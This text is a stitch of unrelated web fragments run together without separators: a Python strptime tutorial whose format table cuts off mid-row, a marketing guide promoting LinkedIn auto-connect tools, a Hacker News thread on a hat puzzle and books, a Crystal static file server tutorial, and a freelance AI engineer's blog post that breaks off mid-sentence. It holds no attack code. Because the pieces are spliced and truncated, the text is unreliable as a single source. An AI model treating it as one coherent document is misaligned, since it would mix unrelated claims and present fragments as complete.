string\n(with the help of examples).\n\nThe `strptime()` method creates a [datetime](/python-\nprogramming/datetime#datetime) object from the given string.\n\n**Note:** You cannot create `datetime` object from every string. The string\nneeds to be in a certain format.\n\n* * *\n\n## Example 1: string to datetime object\n\n    \n    \n    \n    from datetime import datetime\n    \n    date_string = \"21 June, 2018\"\n    \n    print(\"date_string =\", date_string)\n    print(\"type of date_string =\", type(date_string))\n    \n    date_object = datetime.strptime(date_string, \"%d %B, %Y\")\n    \n    print(\"date_object =\", date_object)\n    print(\"type of date_object =\", type(date_object))\n    \n\nWhen you run the program, the output will be:\n\n    \n    \n    \n    date_string = 21 June, 2018\n    type of date_string = <class 'str'>\n    date_object = 2018-06-21 00:00:00\n    type of date_object = <class 'datetime.datetime'>\n    \n\n* * *\n\n### How strptime() works?\n\nThe `strptime()` class method takes two arguments:\n\n  * string (that be converted to datetime)\n  * format code\n\nBased on the string and format code used, the method returns its equivalent\n`datetime` object.\n\nIn the above example:\n\n![How strptime\\(\\) works in\nPython?](//cdn.programiz.com/sites/tutorial2program/files/python-strptime.jpg)\n\nHere,\n\n  * `%d` \\- Represents the day of the month. **Example:** 01, 02, ..., 31\n  * `%B` \\- Month's name in full. **Example:** January, February etc.\n  * `%Y` \\- Year in four digits. **Example:** 2018, 2019 etc.\n\n* * *\n\n## Example 2: string to datetime object\n\n    \n    \n    \n    from datetime import datetime\n    \n    dt_string = \"12/11/2018 09:15:32\"\n    \n    # Considering date is in dd/mm/yyyy format\n    dt_object1 = datetime.strptime(dt_string, \"%d/%m/%Y %H:%M:%S\")\n    print(\"dt_object1 =\", dt_object1)\n    \n    # Considering date is in mm/dd/yyyy format\n    dt_object2 = datetime.strptime(dt_string, \"%m/%d/%Y %H:%M:%S\")\n    print(\"dt_object2 =\", dt_object2)\n    \n\nWhen you run the program, the output will be:\n\n    \n    \n    dt_object1 = 2018-11-12 09:15:32\n    dt_object2 = 2018-12-11 09:15:32\n    \n\n* * *\n\n## Format Code List\n\nThe table below shows all the format codes that you can use.\n\n**Directive** | **Meaning** | **Example**  \n---|---|---  \n`%a` | Abbreviated weekday name. | Sun, Mon, ...  \n`%A` | Full weekday name. | Sunday, Monday, ...  \n`%w` | Weekday as a decimal number. | 0, 1, ..., 6  \n`%d` | Day of the month as a zero-padded decimal. | 01, 02, ..., 31  \n`%-d` | Day of the month as a decimal number. | 1, 2, ..., 30  \n`%b` | Abbreviated month name. | Jan, Feb, ..., Dec  \n`%B` | Full month name. | January, February, ...  \n`%m` | Month as a zero-padded decimal number. | 01, 02, ..., 12  \n`%-m` | Month as a decimal number. | 1, 2, ..., 12  \n`%y` | Year without century as a zero-padded decimal number. | 00, 01, ..., 99  \n`%-y` | Year without century as a decimal number. | 0, 1, ..., 99  \n`%Y` | Year with century as a decimal number. | 2013, 2019 etc.  \n`%H` | Hour (24-hour clock) as a zero-padded decimal number. | 00, 01, ..., 23  \n`%-H` | Hour (24-hour clock) as a decimal number. | 0, 1, ..., 23  \n`%I` | Hour (12-hour clock) as a zero-padded decimal number. | 01, 02, ..., 12  \n`%-I` | Hour (12-hour clock) as a decimal number. | 1, 2, ... 12  \n`%p` | Locale\u2019s AM or PM. | AM, PM  \n`%M` | Minute as a zero-padded decimal number. | 00, 01, ..., 59  \n`%-M` | Minute as a decimal number. | 0, 1, ..., 59  \n`%S` | Second as a zero-padded decimal number. | 00, 01, ..., 59  \n`%-S` | Second as a decimal number. | 0, 1, ..., 59  \n`%f` | Microsecond as a decimal number, zero-padded on the left. | 000000 -\n999999  \n`%z` | UTC offset in the form +HHMM or -HHMM. |  \n`%Z` | Time zone name. |  \n`%j` | Day of the year as a zero-padded decimal number. | 001, 002, ..., 366  \n`%-j` | Day of the year as a decimal number. | 1, 2, ..., 366  \n`%U` | Week number of the year (Sunday as the first day of the week).

A lot of our users spend time on LinkedIn, participate in iOS\ngroups or post articles there. I often post cool stuff in those groups, engage\nwith people via direct messages or share my writings. Unfortunately, I do get\nspam or some random requests from job seekers\\recruiters. But in general,\nLinkedIn works for me.\n\n\ud83d\udccc Useful tools:\n\n  * If you need to grow your LinkedIn connection base, use this [script](https://docs.google.com/spreadsheets/d/10P2Exz5ctRRdvwOaXkFZFTmGcnvv9L5UbBmfPzqKWI8/edit#gid=0). It will automatically add targeted people from the \"People You May Know\" section. You only need to choose the keywords.\n  * [Dux-Soup](https://www.dux-soup.com/#see) is another good tool to automatically add LinkedIn connections + send invitations. A free account is not very useful but the paid version is pretty good (worth 15$ a month). It has auto-inviting with personalised messages, auto-messages to 1st-degree connections, downloading your tag-lists with links to profiles.\n  * [LinkedIn X-Ray Search tool using Google](https://www.lisearcher.com/). With a free account, you only get 100 search results. To get around this limitation you can use X-Ray Searching.\n\n### \u2754Quora\n\nQuora is a question-and-answer site, where you can get traffic by helping the\ncommunity:\n\n  * [Growth Hacking 1,500+ Visits From Quora](http://webris.org/how-to-drive-10000-monthly-visits-using-quora/) by Ryan Stewart.\n  * [How to Get Thousands of Leads from Quora in Five Months](https://sumo.com/stories/quora-traffic) by Josh Fechter, the \"Top Quora Writer of 2017.\"\n  * [How To Use Quora For SEO & Content Marketing](https://www.shivarweb.com/10583/how-to-use-quora-for-seo-content-marketing/) by Nate Shivar.\n\n## Viral Marketing\n\n[The K-Factor, \u201cGrowth\u201d and Going\nViral](https://bothgunsblazingblog.wordpress.com/2013/10/22/the-k-factor-\ngrowth-and-going-viral/), an old but very useful article on viral growth.\n\n## \ud83d\udc8c Lifecycle Email Marketing\n\nLifecycle emails can help you to accomplish almost any marketing goal: onboard\nnew users, increase sales, grow users' engagement, bring back inactive one or\nbuild a long-lasting relationship. It's also known as drip marketing or\nautomated email campaigns. To make it simple: it's a set of emails that will\nbe sent out automatically based on schedule, triggers, or user actions. There\nare four key components for such email campaigns: the right user, goal-\noriented topic, good timing and contextual message.\n\n\ud83d\udcbb Let's start with onboarding. The goal of it is to increase the number of\nusers who actually use your product (or free trial) and pay for it later. The\nonboarding process can be done through in-app messages, live chat messages,\nproduct tours, welcome modal windows, well-crafted UX or even phone calls.

When C is asked if he knows the color of the hat\n            he is wearing he says yes and he is correct. What color hat and how\n            can this be?\n    \n    \n        .. class:: attribution caption\n    \n        ~ `Three Hats`_\n    \n    \n        Solution\n        ------------\n    \n        I'm going to call the three men Alan, Bob, and Chuck.\n    \n        First, let's imagine what Alan might be able to see.

In other\n        words, by admitting that he can't tell which hat he is wearing Alan is\n        saying that either or both of Bob's and Chuck's hats are black.  If we\n        eliminate the case of both hats being white we are left with three\n        possibilities.\n    \n        ===========  =============\n         Bob's Hat    Chuck's Hat\n        ===========  =============\n         Black        White\n         White        Black\n         Black        Black\n        ===========  =============\n    \n        From this it should be easy to see that if Bob sees that Chuck's hat is\n        white his own hat would have to be black.  Bob would be uncertain of the\n        color of his own hat only if Chuck's hat is black.  So Chuck, being no\n        dummy, can conclude that his own hat is black.\n    \n        It's an elegant puzzle with a very simple and satisfying solution.\n    \n    \n        .. _cool puzzle site: http://wuriddles.com/\n    \n        .. _Three Hats: http://wuriddles.com/easy.shtml#3hats  \n  \n---|---|---  \n| ![](s.gif)|  [](vote?id=23163445&how=up&goto=item%3Fid%3D23151144) |\n\n[pippy](user?id=pippy) [27 days ago](item?id=23163445)\n[](javascript:void\\(0\\))\n\n  \n\nHere's a nice variation to the problem, and the solution:\n<https://www.youtube.com/watch?v=N5vJSNXPEwA>  \n  \n---|---|---  \n| ![](s.gif)|  [](vote?id=23162763&how=up&goto=item%3Fid%3D23151144) |\n\n[davidgould](user?id=davidgould) [27 days ago](item?id=23162763)\n[](javascript:void\\(0\\))\n\n  \n\n\u201cI have a gun.\u201d  \n  \n---|---|---  \n| ![](s.gif)|  [](vote?id=23155242&how=up&goto=item%3Fid%3D23151144) |\n\n[whytai](user?id=whytai) [28 days ago](item?id=23155242)\n[](javascript:void\\(0\\))\n\n  \n\nMeditations by Marcus Aurelius.\n\nThis book makes every bit of life advice you receive afterwards feel shallow.\nIt feels like a reference to western thought.\n\nIt's also very well translated and reads very easily, and is very short.

It takes a\ndifferent approach and mindset to appreciate it but it's incredibly rewarding\nwhen one does. Think \"acquired taste\", or maybe the difference between reading\na pop-math book and a math textbook. Ditto reading non-contemporary fiction,\nso that's two hurdles to overcome in this case. I don't have any sage advice\non how to gain the ability to read and enjoy literature, aside from that for\nmost people it takes practice and persistence before it's comfortable, like\ngetting used to the temperature of a pool. Starting small helps and is\nprobably how most people work up to the point of being genuinely _excited_ and\n_gripped_ by something like Moby Dick.\n\nI guess if I had any advice to offer to someone wanting to achieve that (if\nit's an achievement) it'd be to try older popular literature (try _King\nSolomon's Mines_ , it's amazing, then work your way to even older stuff) to\nget used to older English (nb _not_ Old English, which is another thing\nentirely and you're not likely to encounter much of it in anything but an\n_extremely_ deep reading of English lit) and to read short, relatively easy\n\"literary\" works that are more recent.

Stephen King praises the book in his\nown book, On Writing. I've also read a few articles on writing that say the\nsame basic thing.\n\nThe gist of these books is to write in service of the reader (as opposed to\nyour ego) and to work hard at it (as opposed to being lazy and just \"letting\nit all hang out\" from the first draft), as it is a craft, like carpentry.\nSpecifically, try to avoid wasting words, try to use the best word at each\npoint, and try to order your words (and sentences and paragraphs) in the best\nway for the reader's understanding.\n\nThere are some minor rules and preferences that perhaps Geoff Pullum is\npouncing on, something like, \"A clever horse is a good-natured one, not an\ningenious one.\" I can see clearly that that is an archaism and take it for\nwhat it's worth. After all, the book is about 100 years old. But any writer\nshould know that when you get down to that level of resolution, the detail\nshifts a bit in the quantum foam. Things on that level vary a bit from one\ndecade to another, from one region to another. And language is like a craft,\nin that there are some rules that can be followed 90% of time, but it is not\nmathematics. You cannot distill a formula. I see Geoff Pullum taking it as\nblack and white, but English does not submit to such simplification.\n\nPerhaps Strunk was more black and white, but White seems a bit looser, and I\nthink their combination balances each other out nicely. It reminds me that no\nrule is absolute. However, for the vast majority of writers, they would\nbenefit from at least trying to follow a lot of them!\n\n> The book presents a profoundly ignorant picture ofthe English language. You\n> cannot become a good writer shackled to Strunk and White.\n\nFor 80% of the writing I read in books, magazines, articles, etc., they suffer\nfrom the kinds of problems addressed in the Elements of Style. There may be\nother kinds of problems in a minority of writing, but far and away most\nwriting suffers heavily from wordiness, vagueness, clumsy construction.

Lewis's writing in general, but\ncertain parts of Mere Christianity annoyed me because it felt manipulative.\nThe most egregious example is Lewis's trilemma which seems constructed to win\narguments, although I've never seen it win a single argument, not by a good\nfaith argument but by putting someone on the spot and demanding that they to\nchoose between three answers; Two of which will make them sound exceedingly\nrude and harm their standing in society.  \n  \n---|---|---  \n| ![](s.gif)|  [](vote?id=23157965&how=up&goto=item%3Fid%3D23151144) |\n\n[alan-crowe](user?id=alan-crowe) [28 days ago](item?id=23157965)\n[](javascript:void\\(0\\))\n\n  \n\nThe most interesting response that I've seen to Lewis's trilemma came from a\npsychiatric nurse. His experience of working in an psychiatric hospital was\nthat people with delusions, such as thinking they are Napoleon, didn't seem\nparticularly off. They were pleasant, and easy to care for. Over the course of\nweeks, one would get to know them. It would gradually become apparent that the\ndelusional thinking went very deep. They really did need residential care.\n\nSo Lewis's rhetoric depends on \"lunatic\" connoting \"raving lunatic\" and there\nare actually four branches to his tri-lemma: liar, God, raving lunatic, some-\none with serious psychiatric issues who generally holds it together and seems\nnormal much of the time.  \n  \n---|---|---  \n| ![](s.gif)|  [](vote?id=23159670&how=up&goto=item%3Fid%3D23151144) |\n\n[goto11](user?id=goto11) [27 days ago](item?id=23159670)\n[](javascript:void\\(0\\))\n\n  \n\nMy take on the trilemma is that Jesus never actually claimed to be God in the\nfirst place.  \n  \n---|---|---  \n| ![](s.gif)|  [](vote?id=23161272&how=up&goto=item%3Fid%3D23151144) |\n\n[guide42](user?id=guide42) [27 days ago](item?id=23161272)\n[](javascript:void\\(0\\))\n\n  \n\nIt didn't because declaring it was inconceivable in the Judeo view.

Or Maybe we are building a static file server for fun \ud83c\udf79\ud83c\udf34?\n\nWell, it doesn't matter why, but we need a Static File Server ... and soon!\nHere we are going to see how easy is to build one using the\n[Crystal](https://crystal-lang.org) language! Yeah!!\n\n#  A Server object, s'il vous plait \u261d\ufe0f\ud83c\udfa9\n\nFirst we need to create a [HTTP Server](https://dev.toHTTP::Server) object. We\nmay initialize this `server` object with an array of\n[handlers](https://crystal-lang.org/api/latest/HTTP/Handler.html) also known\nas [handler chain](https://crystal-\nlang.org/api/latest/HTTP/Server.html#handler-chain). When a request arrives to\nthe server then it goes through the handler chain: each handler (having a\nspecific purpose) will process the request and then it will forward the\nrequest to the next handler and so on and so on...\n\nFor our static file server we are going to create a chain using:\n\n###  [HTTP::LogHandler](https://crystal-\nlang.org/api/latest/HTTP/LogHandler.html)\n\nAs the documentation says this is _a handler that logs the request method,\nresource, status code, and the time used to execute the next handler, to the\ngiven IO._\n\n###  [HTTP::ErrorHandler](https://crystal-\nlang.org/api/latest/HTTP/ErrorHandler.html)\n\nThis handler _invokes the next handler and, if that next handler raises an\nexception, returns with a 500 (Internal Server Error) status code._\n\n###  [HTTP::StaticFileHandler](https://crystal-\nlang.org/api/latest/HTTP/StaticFileHandler.html)\n\nAs the name says this handler is _a simple handler that lists directories and\nserves files under a given public directory._ In this case, the directory will\nbe `./public`\n\nAnd here is the code for creating the `HTTP::Server` object:  \n\n    \n    \n    server = HTTP::Server.new([\n      HTTP::LogHandler.new,\n      HTTP::ErrorHandler.new,\n      HTTP::StaticFileHandler.new(\"./public\"),\n    ])\n    \n    \n\n#  Hey, `server`! Listen! \ud83e\udd16\ud83c\udfa7\n\nNow that we have our `server` object, we need to specify the `port` to listen\nand to start listening! It's as easy as:  \n\n    \n    \n    server.bind_tcp 8081\n    server.listen\n    \n\n#  And the final result is ... \ud83e\udd41\n\n    \n    \n    # file_server.cr\n    require \"http\"\n    \n    path = \"./public\"\n    server = HTTP::Server.new([\n      HTTP::LogHandler.new,\n      HTTP::ErrorHandler.new,\n      HTTP::StaticFileHandler.new(path),\n    ])\n    \n    address = server.bind_tcp 8081\n    puts \"Listening on http://#{address} and serving files in path #{path}\"\n    server.listen\n    \n    \n\nTo start the server \ud83d\ude80  \n\n    \n    \n    $ crystal file_server.cr\n    Listening on http://127.0.0.1:8081 and serving files in path ./public\n    \n\nAnd that's it!!  \nNow we have a file server running on `localhost`, port `8081`, serving files\nin the folder `./public`.\n\nTold you it was easy!! \ud83d\ude09\n\n##  Farewell and see you later.\n\n**Coming next:** We are going to parameterize this static file server!  \nStay tuned! \ud83d\udcfb\n\n\ud83d\udc4f As always thanks to:  \n[@bcardiff](https://dev.to/bcardiff) and\n[@diegoliberman](https://dev.to/diegoliberman) for reviewing this post and\nimproving the code and text!!\n\n_Photo by Jonathan Singer on Unsplash_\n\nA Crystal Story (3 Part Series)\n\n[ 1) A Crystal Story: Simple Static File Server! ](/franciscello/a-crystal-\nstory-simple-static-file-server-5fep \"Published Jan 14\") [ 2) A Crystal Story:\noh! so many options! ](/franciscello/a-crystal-story-oh-so-many-options-8am\n\"Published Jan 21\") [ 3) A Crystal Story: A container that sails!\n](/franciscello/a-crystal-story-a-container-that-sails-1d37 \"Published Jan\n29\")\n\n![heart](https://practicaldev-herokuapp-\ncom.freetls.fastly.net/assets/emoji/emoji-one-\nheart-f5a59d5d1b6cfe4e2c956c0ed63cd644820683dcd5c5a051d810fa6efe67a6ce.png)\n![unicorn](https://practicaldev-herokuapp-\ncom.freetls.fastly.net/assets/emoji/emoji-one-\nunicorn-5ffa914ffa8a4673b1beec4a3a3480349448139244da9a05e59ea86be893bc27.png)\n![reading list](https://practicaldev-herokuapp-\ncom.freetls.fastly.net/assets/emoji/emoji-one-bookmark-\nccfd418797c0943cfa4685abed8990f0f6477be9d2702cdca9663fc4ef13eb37.png) [\n![twitter logo](https://practicaldev-herokuapp-\ncom.freetls.fastly.net/assets/twitter-f95605061196010f91e64806688390eb1a4dbc9e913682e043eb8b1e06ca484f.svg)\n](https://twitter.com/intent/tweet?text=\"A%20Crystal%20Story%3A%20Simple%20Static%20File%20Server%21\"\nby @franciscello %23DEVCommunity https://dev.to/franciscello/a-crystal-story-\nsimple-static-file-server-5fep) DISCUSS\n\n![dropdown menu icon](https://practicaldev-herokuapp-\ncom.freetls.fastly.net/assets/three-\ndots-f4003d381cc7530ee7d28f13c9f3d7541c173d6e12dde1c8f09b4aea67a578aa.svg)\n\n![Copy to Clipboard](https://practicaldev-herokuapp-\ncom.freetls.fastly.net/assets/content-\ncopy-8cf07612d6f4decff7188a5910c4fcd8caf1e7bb73f5a88eb7753a20c728d00e.svg)\nCopied to Clipboard\n\n[ Share to Twitter\n](https://twitter.com/intent/tweet?text=\"A%20Crystal%20Story%3A%20Simple%20Static%20File%20Server%21\"\nby @franciscello %23DEVCommunity https://dev.to/franciscello/a-crystal-story-\nsimple-static-file-server-5fep)\n\n[ Share to LinkedIn\n](https://www.linkedin.com/shareArticle?mini=true&url=https://dev.to/franciscello/a-crystal-\nstory-simple-static-file-server-5fep&title=A Crystal Story: Simple Static File\nServer!&summary=Maybe we need to serve the files for our great-awesome new\nclient-side application \ud83d\ude0e?

My \u201cachievements\u201d in the past year include:\n\n  * Writing and publishing [Real-World NLP](https://www.manning.com/books/real-world-natural-language-processing), my NLP introduction book that I\u2019ve been working on the past 1.5 years\n  * Doing research and launching many open-source NLP projects, including [TEASPN](https://www.teaspn.org/), [NanigoNet](https://github.com/mhagiwara/nanigonet), [Github Typo Corpus](https://github.com/mhagiwara/github-typo-corpus), and most recently, [Open Language Profiles](https://www.openlanguageprofiles.org/)\n  * Developing [an ultra-fine-grained NER system](http://masatohagiwara.net/files/201911_TAC_KBP.pdf), which ranked at #2 at TAC-KBP 2019, using transfer and multitask learning\n  * Working on [an introductory course to teach AllenNLP](https://twitter.com/mhagiwara/status/1196851043021144065), which will be launched within a couple of months\n  * Many other client projects that are not public\n\nNow, I believe that becoming a freelance AI engineer is a totally viable\ncareer choice (but only for those who are cut out for it\u2014see below). A number\nof friends and people that I know asked what it\u2019s like to be a freelancer.\nMany of them haven\u2019t even heard of any \u201cfreelance researchers\u201d before (yeah,\nme neither). That\u2019s why I\u2019m writing down my thoughts and experience here so\nthat this might be useful if you are even vaguely interested.\n\n## Should you be a freelancer?\n\nThe answer is probably \u201cno\u201d for the vast majority of people. Being a\nfreelancer is not for everyone. You need to be a type of person who enjoys\nbeing a freelancer. More on this later.\n\nYou also have to be really good at what you do. Put yourself in the client\u2019s\nshoes and think of this as hiring a contractor, be it a plumber or an\nattorney. You hire them because, by paying them, you expect that they can\nalmost certainly solve your problem, not because you want them to be \u201cpart of\nyour team\u201d and work on the problem together, offering them opportunities for\nlearning and growing, along with plenty of PTO days and free lunch.\n\nAs a freelance AI engineer, you are expected to, for example, start with a\nclient, familiarize yourself with the product and the codebase, submit the\nfirst PR within a couple of days, and complete your first business-metric\nimpacting ML prototype or pipeline within the first couple of weeks. If you\nare just starting out in the AI field, I think your best bet is to go work at\na large company (e.g., FAANG) with plenty of resources and growing\nopportunities, or at a fast-growing start-up (if you are not sure which one,\nI\u2019ve heard good things about [Duolingo](https://www.duolingo.com/)) and build\nyour experience as a full-time employee.\n\n## Getting paid\n\nI charge hourly. I\u2019ve never done project-based billing. I think AI projects\nare better suited for hourly billing, because it\u2019s simply too hard to define\nthe scope of work based on the deliverables.\n\nMy current rate is $200/hour for short-term commitments (e.g., a couple hours\nper month) and $150/hour longer-term commitments (e.g., 10+ hours per week).\nThere\u2019s only one time when I was told my rate is too expensive, but most\nclients just take these rates as fixed. When clients can\u2019t afford my rates, we\nusually negotiate in terms of the scope of work (e.g., hours per week) instead\nof the rate. The rates of an average US-based AI engineer with my skills are\nprobably higher. I probably should increase my rates. I probably should have\nlong ago...\n\nThanks to the \u201cAI boom\u201d of recent years, it's completely a seller's market for\nfreelance AI engineers (again, if you are good). You will never run out of\nclient leads and inbound requests. I think a good rule of thumb is to keep\nincreasing your rates until you start getting \u201cno\u201ds with a 50% chance. You are\nstill left with the other 50%, which tend to be better clients anyways. As a\nside effect, you\u2019ll get very good at saying no. My default answer is always\nno, and my schedule is always full (except when it\u2019s not, as my current\nclients know).\n\n## Making a living\n\n[ ![The prospect theory is real](img/prospect_theory.png) The prospect theory\nis real ](https://en.wikipedia.org/wiki/Prospect_theory)\n\nWe have enough savings to keep us from being hungry for a couple of years even\nif I didn\u2019t work at all, and my wife works full time, which was really helpful\nwhen I made the leap. Even with enough savings, though, cash flow fluctuation\ncan have a noticeable impact on your sense of financial security. If you work\nwith [net 30](https://en.wikipedia.org/wiki/Net_D) clients, for example, it\ntakes two months to get paid after you start working for them. I had some\nshort periods of time when we had negative cash flow (especially when we moved\nfrom Pittsburgh to Seattle last summer) that ate our savings, and I really\nfelt the impact of loss aversion. You feel a lot worse losing a certain amount\nof money than you feel better gaining the same amount. If financial security\nis your priority, you should probably get a full-time job.\n\nCompared to when I was working full-time, I made less money but also worked\nfewer hours in the past year. I could totally have worked more to make more,\nbut having small kids, spending time with my family is important.\n\n## Finding clients\n\n![West Coast NLP 2019](img/wcnlp2019.jpg) West Coast NLP 2019\n\nI found most of my current and past clients through my network. Conferences\nand workshops are also good sources of potential leads, especially when you\ngive talks instead of just listening to them. When I find a potential client\nthat I really want to work with, I apply directly from the \u201ccareers\u201d page. A\nsurprisingly large number of employees, especially start-ups, are open to\nremote and/or part-time commitments for the right candidates if you are\nupfront about it.\n\nAs a freelancer, you are always on the lookout for potential clients, since\nmost contracts don\u2019t last more than several months. This is a big difference\nbetween being a full-time employee and a freelancer. At least when I was\nworking full time, my \u201cjob search\u201d was very bimodal\u2014I was either not looking\nat all or looking actively. If you just want a stable job and a paycheck,\nfreelancing is probably not a good idea.\n\n## Freedom\n\n![Seoul, 2018](files/Seoul1.jpg) Seoul, 2018\n\nPeople say the biggest perk of being a freelancer is freedom\u2014you can work\nanywhere you like, anytime you want. This is probably not the most important\nfactor, at least for me. Especially in the tech industry, many employers are\nalready fine with employees working from anywhere and at anytime as long as\nthey get things done. Even before becoming a freelancer I was able to work\nfrom home whenever necessary (for example, my kid getting sick), and in 2018,\nI even spent a month in South Korea working remotely while learning Korean. If\nyou are thinking about becoming a freelancer just because of freedom of\nlocation or time, you should probably consider finding a better employer\nfirst.\n\nBeing a freelancer, you have full control over how much you work. On the other\nhand, working full time, especially for a start-up, is very \u201cbinary\u201d\u2014basically\nyou go all in or you are out. You are expected to work at your full potential.\nYou can\u2019t usually, say, work 20 hours per week to collect half the paycheck.\nFreelancers can do this fairly easily, which is one of the biggest perks of\nbeing independent.\n\nI\u2019m also a type of person who always has tons of project ideas that I want to\nwork on which may or may not be relevant to what I do for the employer that I\nhappen to work for at that time. I\u2019ve always considered myself more of an\nartist than an engineer/researcher, and being a freelancer is a natural\nconsequence of this. If you work full time for a demanding job, good luck\nworking on a side hustle or even finding energy for one at all. As a\nfreelancer, everything becomes a side hustle. All the clients I work with know\nthat I work with other people and on my own things and nobody cares (although\nsome clients want to put a non-compete clause in the contract, which I fully\nrespect).\n\n## Time management\n\nAs a freelancer, you need to be good at managing your time, which equals your\nclients\u2019 money. I\u2019m a huge fan of [the Pomodoro\ntechnique](https://en.wikipedia.org/wiki/Pomodoro_Technique) and manage all my\nwork with pomodoros (oops, I meant _pomodori_ ). I can reliably do about 80\npomodori (= 40 hours) in a typical work week. If you\u2019ve ever used the Pomodoro\ntechnique, you\u2019d probably know how hard that would be and how much work that\nis. If you haven\u2019t, you should seriously consider giving it a try\u2014you\u2019d\nrealize how hard it is to actually \u201cwork\u201d for 8 hours in a day (i.e., no web\nsurfing, no phone checking, no useless Slack chats, etc.). I use\n[Freedom](https://freedom.to/) on my laptop and [Stay\nFocused](https://play.google.com/store/apps/details?id=com.stayfocused&hl=en_US)\non my phone to block distracting sites during the day. I can\u2019t even imagine\nhow I\u2019d possibly be working without them.\n\nNot all of these 40 hours are billable, though. These include personal and\nwork-related overhead such as learning (see below), sending invoices, managing\nyour budget, etc. Also, if you work on research, you need to take into account\nthe time you spend for academic activities. If you take on paper reviews for a\nconference, count that in. If you are an organizer of a workshop, count that\nin as well. This helps you be realistic about your \u201cquota\u201d you can use for\neach one of your activities. Before starting a week, I lay out the plan in a\nform of bullet points and the expected number of pomodori associated with each\nactivity. This works a lot better than having a kitchen sink \u201cTODO list\u201d and\nalways lamenting your lack of time.\n\nMany of my clients don\u2019t require regular \u201ccheck-ins,\u201d and currently I spend\nonly 2\u20133 hours in meetings in a typical week. Meetings have huge spillover\neffects and really take their toll on me. For example, if I even have a single\nmeeting in the afternoon, I tend to start vaguely thinking what I\u2019d talk\nabout, if there\u2019s any preparation necessary (including booking a room), etc.\nAfter the meeting, I would recall what we talked about and any necessary\nfollow-ups. All these spillover effects, albeit small, fragment the state of\nthe flow and significantly lower my productivity. Because I spend so little\ntime in meetings, most days I find huge consecutive chunks of time I can spend\nworking, which really helps keep my sanity.\n\n## Work\n\n[ ![Obligatory xkcd reference](https://imgs.xkcd.com/comics/tasks.png)\nObligatory xkcd reference ](https://xkcd.com/1425/)\n\nSo far, this article has had very little to do with the \u201cAI\u201d part. What do I\nactually _do_? In the past year, I wore many different hats\u2014consultant,\nengineer, and researcher. For some clients, I have meetings and offer advice\non how they should go about implementing AI projects. For others, I write code\nas a contract software engineer. For yet others, I work on research and co-\nauthor papers. For many, however, it\u2019s a mix of all of these.\n\nI think modern machine learning work is suitable for part-time commitments. If\nyou are working on large models, it is not uncommon that training takes hours,\nif not days. Machine learning researchers and practitioners alike know how\nmuch time they spend training models and tuning hyperparameters. If you work\nfull time, you have no option but to wait until the training is done or switch\nto other projects, if you have any. As a freelancer, you just switch between\nclients.\n\nAs an ML freelancer, you need to have a strategy for securing GPU resources\nfor training models. Some clients are kind enough that they just let me use\ntheir own infrastructure, but others may not (usually contractors\u2019 access is\nvery limited for security reasons). For my personal and small client projects,\nI just spawn AWS spot instances (usually a p3.2xlarge) as needed, using my own\ncustom AMI. I also have a smaller GPU instance on GCP that I start and stop as\nneeded. I don\u2019t train huge 128-layer Transformer models on TPUs (not just yet)\nor use GPUs 24/7, so this on-demand solution has sufficed so far.\n\nIf you work in AI, it is critical that you allocate time for learning and\npersonal development. If you are working full time, it\u2019s usually part of your\nday job, and you usually spend time reading papers and having \u201creading groups\u201d\nduring work hours. As a freelancer, these hours are usually not billable. You\ncan\u2019t usually bill a client for three hours just because you spent this much\ntime reading papers last week (if you know such a client, or if you _are_ such\na client, do let me know). Remember, you are a professional who was hired to\nsolve client\u2019s problems, not to learn about AI, and everyone expects that you\nare already well read about and caught up with the latest AI development (I\nknow, I know... has anyone ever been caught up with even a single domain of AI\nthese days?) I think this is a price you need to pay in exchange for the\nhigher rates you can enjoy as an AI freelancer.\n\nI live in Seattle, but I\u2019m not sure if it helps with being a freelancer at\nall. I work remotely and rarely travel for work, except when I present at\nconferences. I work with [Allen AI](https://allenai.org/), and it\u2019s nice that\nI can simply drop by on short notice and have lunch with the team, although I\nwould be able to do my work even if I was on the other side of the earth. If\nyou work remotely, I think you\u2019d be better off if you lived in a cheaper city\nand work with clients in other large tech hubs.\n\n## Career development\n\n[ ![Code & Supply, a co-working space in Pittsburgh](img/codeandsupply.jpg)\nCode & Supply, a co-working space in Pittsburgh ](https://codeandsupply.co/)\n\nThere are definitely ways to develop your career and become more experienced\nas a freelancer, but these look very different from full-time jobs. I\u2019m just\nstarting out, so I might have different opinions next year.\n\nThere are usually no pay raises baked into the contracts, unless you\nnegotiate. But you can gradually raise your rates (say, twice a year) until\npeople start to say no. For this reason, I think it is probably easier to make\nmore as a freelancer than as a full-time employee who needs to rely on\nperformance reviews and promotions that are often out of your control.\n\nSpeaking of promotions\u2014as a freelancer, you can stay immune to office\npolitics. You either get the job done or you don\u2019t. You don\u2019t need to be\nconstantly thinking which boss you should be brown-nosing in order to get your\nnext promotion. The flip side of this is you usually don\u2019t gain management\nexperience as a freelancer, although I do mentor junior devs and researchers\nwho work for my clients.\n\nI think it helps to think of yourself as a specialist, not a generalist. For\nexample, if you have a serious health issue that requires a very complicated\nsurgery, you probably don\u2019t want your family doctor to work on it. If you have\na complicated lawsuit that involves millions of dollars at stake, you probably\ndon\u2019t ask your personal tax accountant to give you advice. It\u2019d be your best\ninterest if you don\u2019t just \u201cdo AI.\u201d If you are an AI generalist who just does\n\u201cpredictive modeling\u201d and \u201ctext analytics\u201d using scikit-learn, you\u2019d probably\nattract desperate start-ups or product teams that simply want to have the word\n\u201cAI\u201d on their PowerPoint slides, and you\u2019d need to compete with tons of other\ngeneralist \u201cAI devs\u201d on Upwork who live in countries where wages are way\ncheaper than yours. Narrowing your niche down attracts specific types of\nclients who have specific needs that few people in the world can solve.\n\nMy expertise is NLP/ML for Asian language processing and language education.\nWhen defining your specialty, I think it helps if you define it in terms of\nthe industry, not in terms of an ML stack. People look for, e.g., \u201cAI\nsolutions for healthcare\u201d and \u201ctext analytics for finance,\u201d not for \u201cGANs\u201d or\n\u201cSeq2Seq models.\u201d You need to be willing to learn a very wide range of ML\ntechniques and models, from simple regression to GANs and RL, no matter what\nindustry you work in.\n\nIf you are even vaguely interested in starting your own business, especially a\nB-to-B SaaS business, I think working as a freelancer for a year or so is a\ngreat way to learn about the market demands and transition into the\nentrepreneurial endeavor. If you work with multiple clients and projects in\nyour field, you will surely notice some common patterns and needs. These are\ngreat seeds of product ideas. Some of my open-source projects (e.g.,\n[NanigoNet](https://github.com/mhagiwara/nanigonet) and [Open Language\nProfiles](https://www.openlanguageprofiles.org/)) were born this way.\n\n## Making it legit\n\n![Seattle](img/seattle.jpg)\n\nI incorporated a single-member LLC just for freelancing (and filed a foreign\nentity after I moved to Washington). I sign all the contracts as an owner of\nmy LLC. Some of my non-US clients prefer it if I have \u201ca company.\u201d I\u2019m not a\nlawyer so you need to take everything written 